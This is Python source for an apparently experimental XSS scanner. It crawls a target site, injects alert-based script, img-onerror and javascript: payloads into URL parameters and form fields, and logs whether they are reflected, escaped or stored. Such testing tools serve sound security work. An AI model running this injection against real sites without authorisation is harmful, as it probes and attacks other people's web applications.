import time, requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import html
# import random

#list of base payloads for the xss testing for cli
# payload_list = ["<script", "onerror", "onload[]", 
#                  "javascript:", "<script>alert('test')</script>", 
#                  "<img", "<svg", "<script>alert('XSS')</script>", 
#                 "';alert('XSS');//", "<img src='x' onerror='alert(1)'>", 
#                 "javascript:alert('XSS')"]
payload_list = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<script>alert('test')</script>",
    "<script>alert('XSS')</script>", 
    "';alert('XSS');//", "<img src='x' onerror='alert(1)'>", 
    "javascript:alert('XSS')"
]

#"/search?q=<script>alert(1)</script>", "username=<script>alert(1)</script>", "comment=<script>alert(1)</script>"

#def xss_attack(xss_payload, target, xss_config):

#xss attack function to get base logic done and to see if it works using cli
def xss_attack(target, xss_config):
    
    #xss info for the attack 
    xss_log = []
    attack_timer = time.time()
    xss_payload = xss_config.get("payloads") or payload_list
    xss_type = xss_config.get("xss_type", "reflected")

    #part of integration with builder
    attempt_limit = xss_config.get("attempts", 5)
    rate_limit = xss_config.get("rate_limit", 1.0)
    dry_run = xss_config.get("dry_run", True)
    
    
    xss_log.append(f'XSS type: {xss_type}')
    xss_attempt = 0
    xss_success_num = 0
    url = target["url"]
    xss_log.append(f"Attempt limit: {attempt_limit}")
    xss_log.append(f"Rate limit: {rate_limit}")
    xss_log.append(f"Dry run: {dry_run}")

    url_list= [url]
    if xss_config.get("crawl", False):
        xss_log.append("Crawl to find URLs")
        scanned = scan_xss_crawl(url)
        url_list.extend(scanned)
        xss_log.append(f"Scanned and found {len(scanned)} URLs")

    #loop to go through the target and see if there are any attack vulnerabilities for the target
    #for payload in xss_payload[:attempt_limit]:
    base = {}
    for url_index in url_list:
        if url_index not in base:
            try:
                base[url_index] = requests.get(url_index, timeout=10).text
            except:
                base[url_index] = ""
            base_xss = base[url_index]
        for payload in xss_payload[:attempt_limit]:
            # payload = payload_change(payload)
            #updates logs based on information about the xss attack
            xss_log.append(f"XSS Payload for Attack using {payload}")
            xss_attempt += 1
            if dry_run:
                xss_log.append(f"Dry run being done. Attack would test.")
                continue

            params = parameter_extract(url_index)
            if not params: 
                params = [target.get("param", "q")]
            
            for param in params:

                try:
                    # response = requests.get(url_index, params={target.get("param", "q"): payload}, timeout=5)
                    method = target.get("method", "GET").upper()
                    if method == "POST":
                        response = requests.post(url_index, data={param: payload}, timeout=10)
                    else:
                        response = requests.get(url_index, params={param: payload}, timeout=10)
                    #response = requests.get(url_index, params={param: payload}, timeout=10)
                    time.sleep(rate_limit)
                    #soup = BeautifulSoup(response.text, "html.parser")
                    if target.get("sanitizes_input"):
                        xss_log.append("Target sanitized XSS input.")
                        continue

                    xss_log.append("Target did not sanitize XSS input.")

                    if xss_type == "stored":
                        if target.get("stores_input"):
                            xss_log.append("XSS Payload for attack stored.")
                
                    if target.get("output_escaped"):
                        xss_log.append("Output escaped before rendering via payload information.")

                    xss_log.append("Output from XSS payload was not escaped.")

                    #if payload in soup.text:
                    # if payload in response.text and payload not in base_xss:
                    if (payload in response.text or payload.lower() in response.text.lower()) and payload not in base_xss:
                        xss_log.append(f"Payload reflected by: {param}")
                        xss_success_num += 1
                    # else: 
                    #     xss_log.append("Payload not reflected.")
                        
                    
                    # payload_escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
                    # if payload_escaped in soup.text:
                    #     xss_log.append("Payload escaped")
                    elif html.escape(payload) in response.text:
                        xss_log.append(f"Payload escaped by: {param}")
                    else: 
                        xss_log.append(f"No reflection: {param}")
                    
                    # if "Content-Security-Policy" in response.headers:
                    #     xss_log.append("Site has Content Security Policy in header")

                except Exception as error_exception:
                    xss_log.append(f"Error with request/xss: {error_exception}")
                
        site_forms = get_site_forms(url_index)
        xss_log.append(f"Forms on page: {len(site_forms)}")
        
        for form in site_forms:

            form_details = get_form_details(form)
            form_inputs = form_details["inputs"]

            for input_field in form_inputs:

                for payload in xss_payload[:attempt_limit]:
                    xss_log.append(f"Inject payload into form: {payload}")
                    xss_attempt += 1
                    if dry_run:
                        xss_log.append(f"Dry run being done. Attack would test.")
                        continue
                    try: 
                        data = {}
                        for index in form_inputs: 
                            if index["name"] == input_field["name"]:
                                data[index["name"]] = payload
                            else:
                                data[index["name"]] = "test"
                        
                        response = submit_form(form_details, url_index, data)
                        time.sleep(rate_limit)
                        if (payload in response.text or payload.lower() in response.text.lower()) and payload not in base_xss:
                        # if payload in response.text and payload not in base_xss:
                            xss_log.append("Payload reflected form.")
                            xss_success_num += 1
                        elif html.escape(payload) in response.text:
                            xss_log.append("Payload escaped form")
                        if payload not in response.text:
                            time.sleep(1)
                            stored_check = requests.get(url_index, timeout=10)
                            if payload in stored_check.text and payload not in base_xss:
                                xss_log.append("XSS stored")
                                xss_success_num += 1

                        # response = submit_form(form_details, url_index, payload)
                        # stored_check = requests.get(url, timeout=5)
                        # if payload in stored_check.text:
                        #     xss_log.append("XSS stored")
                        #     xss_success_num += 1
                        # time.sleep(rate_limit)
                        # soup = BeautifulSoup(response.text, "html.parser")
                        # #if payload in soup.text:
                        # if payload in response.text or html.escape(payload) in response.text:
                        #     xss_log.append("Payload reflected form.")
                        #     xss_success_num += 1
                        # else:
                        #     xss_log.append("Payload didn't reflect form.")
                    except Exception as error_exception:
                        xss_log.append(f"Error with request/xss: {error_exception}")
                            

    
    #end of attack information for the xss info
    time_done = time.time()
    xss_time = time_done - attack_timer

    if xss_success_num > 0:
        vulnerability = True
        #payload_check = "Successful payload."
    else:
        vulnerability = False
        #payload_check = "Payload failed."

    #returns relevant information from the attack to see the vulnerbility, logs, and other important information
    result = {
        "attack_type": "XSS",
        "vulnerability": vulnerability,
        "attempts": xss_attempt,
        #"xss_successful": payload_check,
        "successful_count": xss_success_num,
        "xss_time": xss_time,
        "xss_log": xss_log,

        "experiment_details": {
            "xss_type": xss_type,
            "rate_limit": rate_limit,
            "dry_run": dry_run,
            "payloads_used": xss_payload[:attempt_limit]
            }
    }
    return result


def get_site_forms(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")

        return soup.find_all("form")
    except requests.exceptions.RequestException:
        return []
    

def get_form_details(form):
    form_details = {}
    
    form_action = form.attrs.get("action", "").lower()
    form_method = form.attrs.get("method", "get").lower()
    
    inputs = get_form_inputs(form)
    form_details["action"] = form_action
    form_details["method"] = form_method
    form_details["inputs"] = inputs
    return form_details


def get_form_inputs(form):
    form_inputs = []
    for input in form.find_all("input"):
        name = input.get("name")
        input_type = input.get("type", "text")

        if name:
            form_inputs.append({"name": name, "type": input_type})

    for text_and_comments in form.find_all("textarea"):
        name = text_and_comments.get("name")

        if name:
            form_inputs.append({"name": name, "type": "textarea"})

    return form_inputs


def submit_form(form_details, url, data):
    #form_action = form.get("action")
    #form_method = form.get("method", "get").lower()

    target_url = urljoin(url, form_details["action"])
    # form_inputs = form_details["inputs"]
    # data = {}

    # for input in form_inputs:
        
    #     if input["type"] == "text" or input["type"] == "search" or input["type"] == "textarea":
    #         data[input["name"]] = payload

    print(f"Submitting payload to {target_url}")

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, timeout=10)
    else:
        return requests.get(target_url, params=data, timeout = 10)
    

def scan_xss_crawl(crawl_url, num_page=5):
    crawled_links = set()
    visit = [crawl_url]
    scanned_urls = []

    while visit and len(crawled_links) < num_page:
        url = visit.pop(0)

        if url in crawled_links:
            continue
        crawled_links.add(url)
    
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")

            for link in soup.find_all("a", href=True):
                new_link = urljoin(url, link["href"])

                if crawl_url in new_link and new_link not in crawled_links:
                    scanned_urls.append(new_link)
                    visit.append(new_link)
        except Exception:
            pass

    return scanned_urls


# def payload_change(payload):
#     changed_payload = [payload.upper(), payload.replace("script", "sCrIpT"),
#         payload.replace("<", "<<"), payload.replace(">", ">>")
#     ]

#     return random.choice([payload] + changed_payload)


def parameter_extract(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return list(params.keys())